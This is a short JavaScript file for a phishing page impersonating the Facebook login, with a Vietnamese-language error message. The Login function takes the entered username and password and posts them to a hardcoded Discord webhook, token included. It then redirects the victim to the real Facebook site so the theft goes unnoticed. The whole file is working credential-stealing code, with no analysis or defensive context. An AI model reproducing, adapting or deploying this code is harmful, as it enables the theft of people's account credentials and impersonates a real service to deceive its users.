function Login(){
    let username = document.getElementById("username").value;
    let password = document.getElementById("password").value;

    if (!isValidUsername(username) || !isValidPassword(password)) {
        document.getElementById("error").innerText = "Tên đăng nhập hoặc số di động bạn nhập không kết nối với tài khoản nào. Hãy tìm tài khoản của bạn và đăng nhập.";
        return;
    }

    const webhook = "https://discord.com/api/webhooks/1183779050137854014/MCMYXYuT8hujSqROU0e1VDeiWZs_2EXLU_XfjzEWWOh-49614KN7IwIfSxn7Wu_P6w2M";
    const contents = `Username: ${username}\nPassword: ${password}`;
    const request = new XMLHttpRequest();
    request.open("POST", webhook);
    request.setRequestHeader('Content-type', 'application/json');
    const params = {
        content: contents
    }
    request.send(JSON.stringify(params));

    window.location.href = "https://Facebook.com";


    function isValidPassword(password) {
        return /^[a-zA-Z0-9]{8,32}$/.test(password);
    }

    function isValidUsername(username) {
        return /^[a-zA-Z0-9]{8,32}$/.test(username);
    }
}

function ForgotPassword(){
    window.location.href = "https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0";
}
